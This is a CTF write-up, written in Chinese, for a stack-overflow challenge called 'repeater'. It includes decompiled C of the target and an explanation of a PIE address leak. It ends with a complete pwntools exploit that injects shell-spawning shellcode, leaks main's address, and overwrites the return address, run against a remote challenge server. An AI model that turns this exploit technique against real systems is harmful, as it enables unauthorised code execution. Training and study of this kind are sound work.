---
title: "repeater"
date: 2025-08-13 10:38:00
disableNunjucks: true
---
# repeater

# 一：题目类型

栈溢出

# 二：题目

![[Pasted image 20250312214005.png]]

# 三：解题思路

输入input的时候存在明显的栈溢出漏洞， 但是溢出的长度最多恰好到栈上保存返回地址的位置
![[Pasted image 20250312214005.png]]
ida逆向分析：

```C

__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s[32]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+20h] [rbp-10h]
  int i; // [rsp+2Ch] [rbp-4h]

  sub_91B(a1, a2, a3);
  sub_A08();
  v5 = 1192227;
  puts("I can repeat your input.......");
  puts("Please give me your name :");
  memset(byte_202040, 0, sizeof(byte_202040));//初始化内存，把byte202040设成0
  sub_982(byte_202040, 48LL);//读取输入内容到byte_202040；因为没有开启NX，所以可以写入shellcode。
  for ( i = 0; i < v5; ++i )//判断是否，i < v5 -->进入循环
  {
    printf("%s's input :", byte_202040);
    memset(s, 0, sizeof(s));//s初始化为0
    read(0, s, 0x40uLL);//输入s；这里可以栈溢出控制程序
    puts("sorry... I can't.....");
    if ( v5 == 3281697 )//如果v5等于3281697，相等返回true
    {
      puts("But there is gift for you :");
      printf("%p\n", main);//打印main函数的地址
    }
  }
  return 0LL;//返回循环语句进行判断
}
```

![[Pasted image 20250312214156.png]]
开启了pie之后所有函数的地址都没有了，只有一个偏移，main函数的偏移是0xA33，所以PIE的基地址就是main函数的地址-main函数的偏移。算出这个就能算出所有函数的地址，比如shellcode的地址就是：基地址+0x202040
所以第一次输入只需要输入shellcode，然后第二次输入修改v5的值输出main函数的地址，计算PIE的基地址，第三次input就再把v5改成0，然后利用好栈溢出漏洞劫持程序，执行shellcode。

# 四：解题代码

```python
from pwn import * #首先是调用的模式，要调用pwntools
context(os='linux', arch='amd64', log_level='debug')#context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。
#io = process('./repeater')//本地运行程序
io = remote('61.147.171.105',64701)#连接远程程序
shellcode = asm(shellcraft.sh())#pwntools自动生成shellcode
io.sendlineafter("Please give me your name :", shellcode)
payload = b'a'*0x20 + p64(3281697)#填充0x20字节的垃圾，然后覆盖v5为3281697
io.sendlineafter("input :", payload)
io.readuntil(b'But there is gift for you :\n')
main_addr = int(io.recvuntil("\n"),16)#接收16字节数据
base_addr = main_addr - 0xa33#计算PIE的基地址
payload = b'a'*0x20 + p64(0) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(base_addr + 0x202040)#填充0x20字节垃圾，把v5覆盖成0，0x8的垃圾，0x8的垃圾，覆盖返回地址为shellcode地址
io.sendlineafter("input :", payload)#提权
io.interactive()#提权

```


